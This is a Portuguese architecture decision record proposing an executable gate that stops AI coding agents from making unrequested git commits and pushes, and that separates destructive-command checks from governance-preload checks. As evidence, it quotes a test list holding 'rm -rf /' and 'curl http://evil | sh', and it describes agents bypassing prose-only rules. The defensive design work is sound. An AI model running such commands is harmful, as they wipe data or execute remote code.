# Registro de Decisão Arquitetural (ADR)

## Metadados

- **Título:** Gate canônico de operação Git e separação do critério de destrutividade
- **Data:** 2026-09-18
- **Status:** Proposta
- **Decisores:** dono do repositório (JailtonJunior94)
- **Relacionados:** [`.specs/prd-harness-portatil-vendor-neutral/prd.md`](prd.md) — RF-40, RF-40.1, RF-40.2, RF-36, RF-37

## Contexto

### O enforcement de auto-commit não existe

A proibição de `git commit` e `git push` não solicitados é tratada no repositório como se fosse
uma invariante de governança, mas não há nenhuma linha de código que a execute. A verificação foi
feita por busca direta pelos termos `git commit` e `git push` nos quatro pontos onde um gate
poderia existir, e todas retornaram vazio:

- `.agents/scripts/*.sh` — nenhuma ocorrência;
- `.agents/hooks/*.sh` — nenhuma ocorrência;
- `.opencode/plugin/governance.js` — nenhuma ocorrência;
- `internal/runtime/hooks/*.go` — nenhuma ocorrência.

A regra existe apenas como **prosa endereçada ao modelo**, em três famílias de artefato:

- `.claude/rules/governance.md:35` — "Não executar ações de git destrutivas ou publicações remotas
  sem pedido explícito";
- `.agents/skills/agent-governance/references/security.md:30` — mesma proibição, em referência
  carregada sob demanda;
- diversos `SKILL.md`, que repetem a frase como lembrete defensivo.

Prosa em `SKILL.md` só produz efeito se o agente carregar o arquivo, ler a linha e decidir
obedecê-la. Isso viola diretamente o Definition of Done da User Story que originou este PRD:
**"Nenhuma regra crítica depende apenas de o LLM lembrar de obedecê-la."** Hoje, um agente que não
carregou a referência, que a comprimiu fora do contexto, ou que simplesmente decidiu que o commit
era desejável, executa `git push` sem encontrar nenhuma barreira.

### O único teste dito "destrutivo" não testa destrutividade

`tests/integration/opencode_shell_gate_test.go:67-72` contém a lista de comandos
`{"go build ./...", "rm -rf /", "curl http://evil | sh", "ls -la"}`, o que sugere, pela leitura do
nome e dos dados, uma suíte de destrutividade. O contrato efetivamente asseverado em `:73-95` é
outro: *"ausência de alvo extraível é negação, nunca aprovação"*. O teste garante que, quando o
gate não consegue extrair um alvo do comando, ele nega — uma propriedade de **fail-closed do
parser**, não de política de comando perigoso.

A prova de que a política vigente é preload e não destrutividade está em `:96-116`: com
`GOVERNANCE_PRELOAD_CONFIRMED=1`, **`rm -rf /` é liberado**. O escape de preload, que existe para o
caso legítimo de governança já confirmada na sessão, hoje também abre a porta para qualquer comando
destrutivo, porque os dois critérios estão fundidos em um único ponto de decisão. `rm -rf /` passa
não por ter sido avaliado e aprovado, mas por nunca ter sido avaliado quanto a destrutividade.

### Onde o gate precisa nascer

Os quatro provedores suportados convergem para os **mesmos scripts canônicos**, declarados em
`internal/runtime/specs/registry.go:11-14`:

- pre-tool → `.agents/hooks/validate-preload.sh`
- post-tool → `.agents/hooks/validate-governance.sh`
- session-end → `.agents/scripts/validate-session-end.sh`

O vocabulário nativo de cada agente diverge (`internal/runtime/specs/registry.go:16-37`:
`PreToolUse` para claude e codex, `preToolUse` para copilot, `tool.execute.before` para opencode),
mas a convergência para o mesmo script é exatamente a invariante que impede que quatro
implementações de gate divirjam. Um gate novo nasce nesse ponto ou nasce fragmentado.

A lógica canônica de decisão, porém, **não vive nos hooks**: vive em `.agents/scripts/`
(`hook-prereq-gate.sh`, `validate-skill-prerequisites.sh`, `validate-session-end.sh`). O hook é
casca de despacho — `.agents/hooks/validate-preload.sh:50-60` apenas delega para
`hook-prereq-gate.sh`. O critério de destrutividade deve seguir a mesma separação.

O plugin OpenCode já carrega metade do caminho: `.opencode/plugin/governance.js:11` define
`MUTATING_TOOLS = new Set(["bash","write","edit","multiedit","patch","apply_patch"])`, consumido em
`:274`. Como `bash` já pertence ao conjunto, **um comando git já passa pelo handler**. O que falta
não é interceptação — é o critério que avalia o comando interceptado.

### Padrões de teste e armadilhas já conhecidos

- **Padrão A (hook shell)**: `tests/integration/hooks_matrix_dispatch_test.go:83-101,110-133` —
  `runHookScriptWithArgs` executa `bash <script>` com stdin JSON, captura stdout e stderr no mesmo
  buffer e extrai o exit code de `*exec.ExitError`. A asserção é **tripla**: exit code (2 =
  bloqueio) + string do validador canônico + string do alvo. O comentário estrutural em `:114-117`
  existe justamente para rejeitar "cadeia de delegação quebrada lendo como gate funcionando".
- **Padrão B (OpenCode)**: `tests/integration/opencode_shell_gate_test.go:15-47` gera um `.mjs`
  temporário que importa o plugin e chama
  `hooks["tool.execute.before"]({tool, sessionID, callID}, {args})`.
- **Lacuna estrutural**: `hooks_matrix_dispatch_test.go` cobre apenas três provedores; OpenCode
  exige harness Node separado. O único teste que cobre os quatro é
  `tests/integration/pretool_decision_parity_test.go:56-92`
  (`TestPreToolDecisionIsIdenticalAcrossAllFourAgents`), que une bash direto (3) e harness Node (1)
  exigindo o **mesmo exit code**.
- **Escapes auditados já existentes**: `GOVERNANCE_PRELOAD_CONFIRMED=1` e
  `GOVERNANCE_PRELOAD_MODE=warn`, ambos gravados em
  `${GOVERNANCE_ESCAPE_LOG:-$project_root/.aispec/governance-escapes.log}`
  (`.agents/hooks/validate-preload.sh`); exit de bloqueio `PRELOAD_BLOCK_EXIT=2`.
- **Espelhamento obrigatório**: script canônico em `.agents/scripts/` é espelhado por
  `scripts/check-scripts-sync.sh:18-28` (lista fixa `EVIDENCE_VALIDATORS`, nove nomes) e por
  `scripts/sync-skills.sh:164-174`.
- **Armadilha de gate órfão**: `tests/integration/sync_gates_guard_test.go:370-421` cobre apenas
  `tests/scripts/*_test.sh`, e `:424-437` mantém lista hardcoded de três alvos de CI. Um gate novo
  não registrado nesses dois pontos passa a existir sem ser executado.
- **Veículo live**: `.github/workflows/hooks-live.yml` — nightly `cron "30 6 * * *"`, `environment:
  hooks-live` protegido, gate explícito de credencial antes de qualquer CLI, pins de versão
  amarrados a constantes Go, matriz 4×3 que **falha em vez de pular**
  (`tests/integration/hooks_live/matrix.go:36-48`), e `assertPreToolOutcome`
  (`live_test.go:152-171`) que distingue três estados de falha e só aprova em `dispatched &&
  !mutated` — evidência positiva de disparo, nunca inferência por ausência.
- **Diagnósticos canônicos** amarrados ao script emissor por guard sem build tag:
  `tests/integration/hooks_live/diagnostics.go:4-12,23-33`.

## Decisão

Criar um **gate canônico de operação Git**, hoje inexistente, e **separar o critério de
destrutividade do critério de preload**.

### 1. Gate canônico de operação Git

A decisão de negar `git commit` e `git push` não solicitados passa a ser código executável, alojado
em um script canônico novo em `.agents/scripts/git-operation-gate.sh` (planejado), invocado por
delegação a partir de `.agents/hooks/validate-preload.sh`, exatamente como
`hook-prereq-gate.sh` já é invocado hoje em `:50-60`.

Consequência direta: os quatro provedores herdam o gate sem nenhuma linha por provedor, porque
todos já convergem para o mesmo pre-tool hook por `internal/runtime/specs/registry.go:11-14`. No
OpenCode, o caminho já está aberto — `bash` pertence a `MUTATING_TOOLS`
(`.opencode/plugin/governance.js:11`), e o handler em `:274` passa a consultar o mesmo critério.

Contrato do gate:

- **Escopo**: operações de escrita remota ou de histórico não solicitadas — `git commit` e
  `git push` como conjunto mínimo obrigatório de RF-40.
- **Fail-closed**: ausência de alvo extraível é negação, herdando o contrato já asseverado em
  `tests/integration/opencode_shell_gate_test.go:73-95`.
- **Exit de bloqueio**: `2`, idêntico a `PRELOAD_BLOCK_EXIT`, para que a asserção tripla do Padrão A
  continue válida sem novo vocabulário.
- **Diagnóstico canônico**: string própria, amarrada ao script emissor pelo guard sem build tag de
  `tests/integration/hooks_live/diagnostics.go:4-12,23-33`, para que a mensagem não possa divergir
  do emissor silenciosamente.

### 2. Separação do critério de destrutividade

Preload e destrutividade passam a ser critérios **independentes e sequenciais**. Confirmar
governança deixa de implicar autorização para comando destrutivo:

- `GOVERNANCE_PRELOAD_CONFIRMED=1` e `GOVERNANCE_PRELOAD_MODE=warn` continuam governando **apenas**
  o critério de preload;
- o critério de operação Git ganha escapes próprios, distintos e auditados, seguindo literalmente o
  padrão existente: registro em
  `${GOVERNANCE_ESCAPE_LOG:-$project_root/.aispec/governance-escapes.log}`, com o mesmo formato já
  emitido por `.agents/hooks/validate-preload.sh`.

Efeito verificável: com preload confirmado, `git push` não solicitado continua bloqueado. A
liberação de `rm -rf /` hoje observada em `opencode_shell_gate_test.go:96-116` deixa de ser
consequência de um escape de preload.

### 3. Cobertura em dois níveis

**Nível determinístico (bloqueia merge).** Suíte de conformidade em
`tests/integration/git_operation_gate_conformance_test.go` (planejado) que invoca o script
canônico com a operação proibida e afirma o bloqueio para os quatro provedores. A suíte unifica
Padrão A e Padrão B atrás de um **runner único** que abstrai `bash <script>` e `node <harness>`,
resolvendo a lacuna estrutural de `hooks_matrix_dispatch_test.go` (três provedores) e generalizando
o que `pretool_decision_parity_test.go:56-92` já faz pontualmente: exigir o **mesmo exit code** dos
quatro. Asserção tripla obrigatória, conforme `hooks_matrix_dispatch_test.go:110-133` — exit code +
diagnóstico do validador canônico + alvo —, para que cadeia de delegação quebrada não leia como
gate funcionando.

**Nível live confirmatório (não bloqueia merge).** Caso novo em
`.github/workflows/hooks-live.yml`, herdando integralmente o veículo: nightly, environment
protegido, gate de credencial antes de qualquer CLI, matriz 4×3 que falha em vez de pular
(`tests/integration/hooks_live/matrix.go:36-48`) e asserção de evidência positiva no padrão de
`assertPreToolOutcome` (`live_test.go:152-171`), aprovando somente em `dispatched && !mutated`.

### 4. Registros obrigatórios de espelhamento e de gate

O script canônico novo **deve** ser registrado em `scripts/check-scripts-sync.sh:18-28` e em
`scripts/sync-skills.sh:164-174`; e a suíte determinística nova **deve** ser registrada em
`tests/integration/sync_gates_guard_test.go:370-421` e na lista hardcoded de alvos de CI em
`:424-437`. Omitir qualquer um desses quatro registros faz o gate nascer fora do gate.

## Alternativas Consideradas

### (a) Manter a proibição apenas como prosa em `SKILL.md` e `rules/`

- **Descrição:** estado atual — a regra vive em `.claude/rules/governance.md:35`,
  `.agents/skills/agent-governance/references/security.md:30` e em diversos `SKILL.md`.
- **Vantagens:** custo zero; nenhuma mudança de código; nenhum risco de falso positivo bloqueando
  trabalho legítimo.
- **Desvantagens:** enforcement inexistente, comprovado por busca vazia nos quatro pontos possíveis;
  a obediência depende de o agente carregar, reter e respeitar a linha.
- **Motivo da rejeição:** falha explicitamente o Definition of Done da User Story — "nenhuma regra
  crítica depende apenas de o LLM lembrar de obedecê-la". É a alternativa que o PRD existe para
  eliminar.

### (b) Implementar o bloqueio por provedor, em cada hook nativo

- **Descrição:** escrever a checagem quatro vezes, no vocabulário nativo de cada agente
  (`PreToolUse`, `preToolUse`, `tool.execute.before`), conforme `registry.go:16-37`.
- **Vantagens:** cada provedor poderia explorar sinais específicos da própria API de hook.
- **Desvantagens:** reimplementa lógica de gate por agente, contrariando a invariante de script
  canônico único de `registry.go:11-14`; quatro cópias divergem em manutenção; a paridade passaria a
  ser verificada por comparação de comportamento em vez de garantida por construção.
- **Motivo da rejeição:** viola a invariante arquitetural que sustenta a portabilidade vendor-neutral
  (RF-36, RF-37) e multiplica por quatro a superfície de regressão.

### (c) Cobrir apenas por teste live

- **Descrição:** validar o gate somente no nightly de `.github/workflows/hooks-live.yml`, contra os
  CLIs reais.
- **Vantagens:** fidelidade máxima ao comportamento de produção; nenhuma manutenção de harness
  determinístico.
- **Desvantagens:** o nightly não é gate de merge; uma regressão em política crítica só apareceria
  no dia seguinte, já integrada em `main`; o job depende de credencial e environment protegido,
  indisponíveis em PR de fork.
- **Motivo da rejeição:** política crítica precisa bloquear merge. O live permanece, mas como
  confirmação, nunca como cobertura primária.

### (d) Manter destrutividade fundida ao critério de preload

- **Descrição:** estender o gate de preload para cobrir também operações Git, sem separar os
  critérios.
- **Vantagens:** um único ponto de decisão e um único conjunto de escapes.
- **Desvantagens:** hoje é exatamente essa fusão que produz o resultado indefensável de
  `opencode_shell_gate_test.go:96-116` — com `GOVERNANCE_PRELOAD_CONFIRMED=1`, `rm -rf /` é
  liberado. Confirmar governança passaria a autorizar `git push`.
- **Motivo da rejeição:** confunde "o agente leu as regras" com "esta operação é permitida". São
  perguntas distintas e precisam de escapes auditados distintos.

## Consequências

### Benefícios Esperados

- A proibição de `git commit`/`git push` não solicitados deixa de ser sugestão textual e passa a ser
  negação executável, satisfazendo o Definition of Done da User Story.
- Os quatro provedores herdam o gate por construção, sem código por provedor, preservando a
  invariante de script canônico único (`registry.go:11-14`) e sustentando RF-36 e RF-37.
- Escape de preload deixa de autorizar operação destrutiva; cada critério passa a ter escape próprio
  e auditável no log de escapes já existente.
- O runner único da suíte de conformidade fecha a lacuna estrutural entre `hooks_matrix_dispatch` e
  o harness Node do OpenCode, criando o mecanismo reutilizável que hoje só existe pontualmente em
  `pretool_decision_parity_test.go`.
- Regressão em política crítica passa a bloquear merge, não a aparecer no nightly do dia seguinte.

### Trade-offs e Custos

- Um script canônico a mais para manter, com espelhamento obrigatório em dois pontos e registro de
  gate em outros dois — quatro locais que precisam permanecer sincronizados.
- Introduz possibilidade de falso positivo: um `git commit` legítimo solicitado pelo usuário
  precisa transitar pelo escape auditado, acrescentando um passo ao fluxo.
- O runner único da suíte de conformidade é abstração nova sobre dois mecanismos de execução
  heterogêneos (`bash` e `node`), com custo de manutenção próprio.
- O caso live novo aumenta a matriz do nightly, que falha em vez de pular
  (`hooks_live/matrix.go:36-48`); indisponibilidade de CLI vira ruído de falha.

### Riscos e Mitigações

| Risco | Impacto | Mitigação |
|-------|---------|-----------|
| Gate nasce órfão: script criado mas não registrado nas listas de sync/CI | Gate existe no repositório e nunca executa; falsa sensação de cobertura | Registro obrigatório nos quatro pontos (`check-scripts-sync.sh:18-28`, `sync-skills.sh:164-174`, `sync_gates_guard_test.go:370-421` e `:424-437`) como critério de conclusão |
| Cadeia de delegação quebrada lendo como gate funcionando | Hook retorna exit 2 por erro de invocação, não por decisão de política | Asserção tripla do Padrão A (`hooks_matrix_dispatch_test.go:110-133`): exit code + diagnóstico canônico + alvo |
| Diagnóstico divergir do script emissor | Mensagem de bloqueio deixa de identificar o gate real | Guard sem build tag de `hooks_live/diagnostics.go:4-12,23-33` amarrando diagnóstico ao emissor |
| Falso positivo bloqueando trabalho legítimo | Fricção operacional e pressão para desativar o gate | Escape dedicado, auditado em `.aispec/governance-escapes.log`, com modo `warn` espelhando o padrão de preload |
| Divergência entre provedores após mudança futura | Um agente passa a permitir o que os outros negam | Suíte de conformidade exige o **mesmo** exit code nos quatro, generalizando `pretool_decision_parity_test.go:56-92` |

**Rollback:** o gate é ativável por modo `warn` no mesmo padrão de `GOVERNANCE_PRELOAD_MODE`. Em
caso de fricção inaceitável, a reversão é a mudança do modo padrão, sem remoção do script nem dos
registros de sync — o que preserva a cobertura determinística e a auditoria de escape.

## Plano de Implementação

1. **Separar os critérios.** Extrair do caminho de preload o ponto de decisão, de modo que o
   critério de destrutividade seja avaliado independentemente de `GOVERNANCE_PRELOAD_CONFIRMED`.
   Marco de verificação: `opencode_shell_gate_test.go:96-116` passa a exigir que preload confirmado
   **não** libere operação destrutiva.
2. **Criar o script canônico** `.agents/scripts/git-operation-gate.sh` (planejado), com contrato
   fail-closed, exit de bloqueio `2` e diagnóstico canônico próprio. Shell sem comentários fora do
   shebang, conforme R-STYLE-001.
3. **Delegar a partir do hook canônico.** `.agents/hooks/validate-preload.sh` invoca o script novo
   no mesmo padrão de delegação já usado em `:50-60` para `hook-prereq-gate.sh`.
4. **Ligar o plugin OpenCode.** `.opencode/plugin/governance.js` passa a consultar o mesmo critério
   no handler de `:274`; nenhuma mudança em `MUTATING_TOOLS` (`:11`) é necessária, pois `bash` já
   pertence ao conjunto.
5. **Registrar espelhamento**: `scripts/check-scripts-sync.sh:18-28` e
   `scripts/sync-skills.sh:164-174`.
6. **Construir o runner único** e a suíte
   `tests/integration/git_operation_gate_conformance_test.go` (planejado), abstraindo
   `bash <script>` (Padrão A) e harness Node `.mjs` (Padrão B) sob uma interface única, com asserção
   tripla e exigência de exit code idêntico nos quatro provedores.
7. **Registrar o gate novo** em `tests/integration/sync_gates_guard_test.go:370-421` e na lista de
   alvos de CI em `:424-437`.
8. **Adicionar o caso live** em `.github/workflows/hooks-live.yml`, herdando environment protegido,
   gate de credencial, pins de versão e asserção de evidência positiva no padrão de
   `assertPreToolOutcome`.
9. **Atualizar a prosa** em `.claude/rules/governance.md` e
   `.agents/skills/agent-governance/references/security.md` para apontar o gate executável como
   fonte de enforcement, mantendo a regra textual como documentação, não como mecanismo.

**Dependências:** o passo 1 precede 2–4; os passos 5 e 7 precedem qualquer declaração de conclusão;
o passo 8 depende de 6.

**Critérios de adoção concluída:**

- busca por `git commit`/`git push` em `.agents/scripts/` retorna o gate novo;
- a suíte determinística falha quando o gate é removido ou a delegação é quebrada;
- com `GOVERNANCE_PRELOAD_CONFIRMED=1`, operação Git não solicitada permanece bloqueada nos quatro
  provedores, com o mesmo exit code;
- os quatro registros de sync e CI estão presentes.

## Monitoramento e Validação

- **Sinal primário:** suíte determinística verde em `test.yml` e vermelha quando o gate é removido —
  validar por remoção deliberada antes do merge, não por inspeção visual.
- **Evidência positiva no live:** o caso novo do nightly só aprova em `dispatched && !mutated`,
  seguindo `hooks_live/live_test.go:152-171`; ausência de sinal nunca conta como aprovação.
- **Log de escape:** acompanhar `${GOVERNANCE_ESCAPE_LOG:-.aispec/governance-escapes.log}`. Volume
  crescente de escape de operação Git indica falso positivo ou fluxo legítimo mal modelado.
- **Guard de gate órfão:** `sync_gates_guard_test.go` deve falhar se o script novo sair das listas de
  espelhamento.
- **Critérios de revisão da decisão:** escapes recorrentes no mesmo fluxo (sinal de que o escopo do
  gate está largo demais) ou divergência de exit code entre provedores (sinal de que a invariante de
  script canônico foi rompida).

## Impacto em Documentação e Operação

- `.claude/rules/governance.md` — a proibição passa a citar o gate executável como mecanismo; a
  prosa permanece como documentação da política.
- `.agents/skills/agent-governance/references/security.md` — mesma atualização; remover a implicação
  de que a leitura da referência é o que garante o comportamento.
- `SKILL.md` que repetem a proibição — ajustar o texto para não sugerir que o cumprimento depende do
  agente.
- [`docs/evidence-gates.md`](../../docs/evidence-gates.md) — registrar o gate novo, seus escapes e o
  exit de bloqueio, ao lado dos validadores de evidência existentes.
- [`docs/troubleshooting.md`](../../docs/troubleshooting.md) — procedimento para o caso legítimo em
  que o usuário pede commit ou push e o gate precisa ser transposto pelo escape auditado.
- `AGENTS.md` — tabela de gates por área tocada, incluindo o alvo de CI novo.
- `.github/workflows/hooks-live.yml` — documentar o caso live novo junto aos demais da matriz 4×3.

## Revisão Futura

- **Marco de revisão:** após dois ciclos completos do nightly com o caso live ativo, ou na primeira
  release que altere `internal/runtime/specs/registry.go`.
- **Eventos que invalidam as premissas:**
  - um quinto provedor que não convirja para os scripts canônicos de `registry.go:11-14`;
  - mudança de vocabulário de hook em qualquer CLI suportada que quebre a delegação;
  - adoção de um mecanismo de política de comando fora do shell (por exemplo, decisão inteiramente
    em `internal/runtime/hooks/`), que tornaria o script canônico redundante.
- **Condições para substituição:** se o critério de destrutividade crescer para além de operações
  Git — cobrindo `rm`, `curl | sh` e afins como política declarativa —, esta ADR deve ser
  substituída por uma que trate destrutividade como catálogo versionado, não como conjunto fixo.
